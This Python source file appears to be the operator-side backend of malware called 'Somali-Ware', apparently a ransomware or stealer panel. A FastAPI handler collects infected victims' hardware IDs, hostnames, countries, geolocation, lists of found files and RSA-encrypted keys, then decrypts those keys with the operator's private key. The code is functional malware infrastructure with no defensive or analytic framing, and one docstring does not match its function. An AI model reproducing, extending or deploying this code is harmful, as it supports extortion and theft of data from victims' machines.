import os
import base64
import logging

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Hash import SHA256

from fastapi import HTTPException, Request


class LogHandler:
    def __init__(self) -> None:
        """Initializes the LogHandler class.

        Args:
            file (UploadFile, optional): File that has been uploaded to the server. Defaults to File(...).

        Raises:
            HTTPException: Raised if the file name is not in the correct format.
        """
        self.KDOT_STEALER_DIR = os.path.join(
            os.getenv("APPDATA"), "Somali-Ware", "logs"
        )

        self.crypt_handler = EncryptionHandler()

    async def process_log(self, request: Request) -> None:
        try:
            request_json = await request.json()

            print(request_json)

            # fmt: off
            self.file_hwid = self.decode_info(request_json["hwid"])
            self.file_country_code = self.decode_info(request_json["country_code"])
            self.file_hostname = self.decode_info(request_json["hostname"])
            self.file_date = self.decode_info(request_json["date"])
            self.file_timezone = self.decode_info(request_json["timezone"])
            self.files_found = self.decode_info(request_json["files_found"])
            self.rsa_key = self.crypt_handler.decrypt(request_json["encrypted_key"])
            self.location = self.decode_info(request_json["location"])
            # fmt: on
        except Exception as e:
            logging.error(f"Error parsing: {e}")
            raise HTTPException("KDot227 on github lmfao")

    def get_file_info(self) -> dict:
        """Gets the file information.

        Returns:
            dict: Returns the file information as a dict.
        """
        return {
            "hwid": self.file_hwid,
            "country_code": self.file_country_code,
            "hostname": self.file_hostname,
            "date": self.file_date,
            "timezone": self.file_timezone,
            "files_found": self.files_found,
            "rsa_key": self.rsa_key,
            "location": self.location,
        }

    def decode_info(self, input_text: str) -> str:
        """Base64 decodes the input text.

        Args:
            input_text (str): Text to be decoded.

        Returns:
            str: Returns the decoded text.
        """
        return base64.b64decode(input_text).decode("utf-8")

    def get_longitude_latitude(self) -> tuple:
        """Gets the longitude and latitude of the location.

        Returns:
            tuple: Returns the longitude and latitude of the location.
        """

        return tuple(self.location.split(":"))


class EncryptionHandler:
    def __init__(self) -> None:
        self.RSA_KEY_PATH = os.path.join(
            os.getenv("APPDATA"), "Somali-Ware", "keys", "private.pem"
        )

        with open(self.RSA_KEY_PATH, "r") as f:
            self.private_key = f.read()

    def decrypt(self, data: str) -> bytes:
        """Decrypts the data using the private key.

        Args:
            data (str): Base64 encoded encrypted data.

        Returns:
            bytes: Decrypted data.
        """
        cipher_rsa = PKCS1_OAEP.new(RSA.import_key(self.private_key), hashAlgo=SHA256)

        print("Received Base64 Encrypted Key in Python:", data)

        # Decode the Base64 encoded data
        encrypted_data = base64.b64decode(data)

        try:
            decrypted_data = cipher_rsa.decrypt(encrypted_data)
            return decrypted_data
        except ValueError as e:
            print(f"Decryption error: {e}")
            raise
